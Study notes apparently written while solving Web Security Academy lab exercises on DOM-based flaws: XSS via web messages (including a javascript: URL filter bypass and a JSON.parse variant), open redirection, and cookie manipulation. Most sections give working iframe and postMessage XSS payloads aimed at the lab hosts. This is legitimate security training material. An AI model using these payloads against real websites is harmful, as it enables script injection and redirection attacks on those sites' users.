### DOM XSS using web messages

So, let's see how Event Listeners and Post Messages work. 

If you create an event listener, like this:
```js
window.addEventListener('message', (e) => {
	console.log(e.data);
});
```

You are creating a new EventListener, we will listen for "message", and when this is received, we can do something.
In this case, we print the value of the web message.

And now, if we create a postMessage:
```js
window.postMessage("Hello World!")
```

We can see it does the log:
![[Pasted image 20240524120637.png]]

So, in our exercise, we see this script in the source:
```html
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

This means, we need to create a postMessage, and this will be executed.
So, if we create a postMessage, we can see it rendered on the page: 
![[Pasted image 20240524120955.png]]

In the exploit server, we can put our payload given by the lab, and see what it's doing:
`<iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')">`

We'll load the vulnerable page on an iframe. When the iframe has finished loading, its going to execute the JS inside the double quotes.
this -> iframe
contentWindow -> window object

And we specify the targetOrigin to `*`, indicating no preference

---
### DOM XSS using web messages and a JavaScript URL

In this case, the eventListener is different:
```html
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http://') > -1 || url.indexOf('https://') > -1) {
			location.href = url;
		}
	}, false);
```

So, what this is doing is creating an event listener, setting the content of the event into a variable "url".
And its looking for "http://" or "https://" inside that variable. If it's true, then location.href is set to the URL.

So, from the browser console, we can create an event listener as follows:
`window.postMessage("javascript:alert(1)//http://")`

We are executing the `javascript:alert(1)` and commenting everything else, but successfully bypassing the filter in the event listener. 

Let's build our payload: 
`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`

---
### DOM XSS using web messages and `JSON.parse`

This is the event listener in this case:
```html
<script>
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
</script>
```

So, breaking this up, we have:
create an event listener. 
Declare 3 variables: iframe, ACMEplayer and "d"

The value of e.data, will be set to "d"
And then, if d.type is "page-load", set d.url to "ACMEplayer.element.src".
So, if we could send a post Message with that attribute, it will be a valid exploit.
`Window.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}")
it should do the trick!

This will be our payload: 
`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

---
### DOM-based open redirection
We can see this line in the source code:
`<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>`

So, if we input in the querystring &url=http://google.com when we click on "back to Blog", we'll be redirected to google.
To solve the lab, redirect it to the exploit server. 

---
### DOM-based cookie manipulation

After you visit a product, the home shows an option "Last viewed product" that has the value of the previous product you visit:
![[Pasted image 20240524153903.png]]

And this is being loaded in the HTML via this line:
`<a href='[https://0a7c006504d05b7f80dd26870025004c.web-security-academy.net/product?productId=1&aaa](view-source:https://0a7c006504d05b7f80dd26870025004c.web-security-academy.net/product?productId=1)'>Last viewed product</a><p>|</p>`

And every post has this script:
```html
<script>
	document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

window.location = the URL
So, if we input this in the URL: `&'><script>alert(1)</script>`, we can get the XSS when clicking "Last viewed product"
This is your payload:
`<iframe src="https://0a7c006504d05b7f80dd26870025004c.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a7c006504d05b7f80dd26870025004c.web-security-academy.net';window.x=1;">`

---
### Exploiting DOM clobbering to enable XSS
https://www.youtube.com/watch?v=eWD4LH5W2Es&list=PLWvfB8dRFqba4RedkuUDWMEkAkP8cdZCW&index=6